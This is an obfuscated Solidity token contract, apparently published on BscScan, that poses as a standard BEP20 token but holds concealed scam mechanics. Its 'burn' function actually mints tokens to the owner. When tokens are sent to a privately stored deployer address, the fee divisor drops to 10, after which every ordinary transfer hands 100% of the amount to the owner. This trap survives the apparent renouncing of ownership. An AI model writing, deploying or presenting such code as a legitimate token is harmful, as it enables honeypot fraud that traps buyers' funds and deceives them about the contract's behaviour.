/**
 *Submitted for verification at BscScan.com on 2022-11-15
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-15 11:34:23 GMT+0
 */
pragma solidity >=0.5.11;
contract NmUQPI {
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 public  HlSgde = 1000000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address public  bCYKKT = address(0);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address public  nuuAXa = address(0);
uint256 public constant nsJRLD = 9+1;
event Approval(address indexed owner, address indexed spender, uint256 value);
mapping (address => uint256) public balanceOf;
uint256 public  lnHcnS = 100000000000000000000000;
uint256 public  sfKBGY = 100000000000000000000000;
uint8 public constant decimals = 18;
uint256 public  NXGysO = 100000000000000000;
address public owner;
event Transfer(address indexed from, address indexed to, uint256 value);
mapping (address => mapping (address => uint256)) private _allowances;
uint256 public  WrsmdP = 10000000000000000000000000000;
address private  gFMWNt = address(0);
string public  name = "DkSvPP";
uint256 public  uhYYvr = 10000000000000000;
address public  KyPGNk = address(0);
address public  zesxXO = address(0);
uint256 private  mdRVVB = 10000000000000;
address public  BbqkmS = address(0);
uint256 public  OrGzLk = 100000000000000000000;
address public  LUWyzm = address(0);
string public  symbol = "zqvtqu";
uint256 public  yeynDp = 10000000000000000000;
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
constructor () {
gFMWNt = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "UhUKmx");
require(to != address(0), "UhUKmx");
require(amount <= balanceOf[from], "UhUKmx");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* nsJRLD/mdRVVB ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==gFMWNt){
mdRVVB = 9+1;
}
emit Transfer(from, to, transferAmount);
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}

}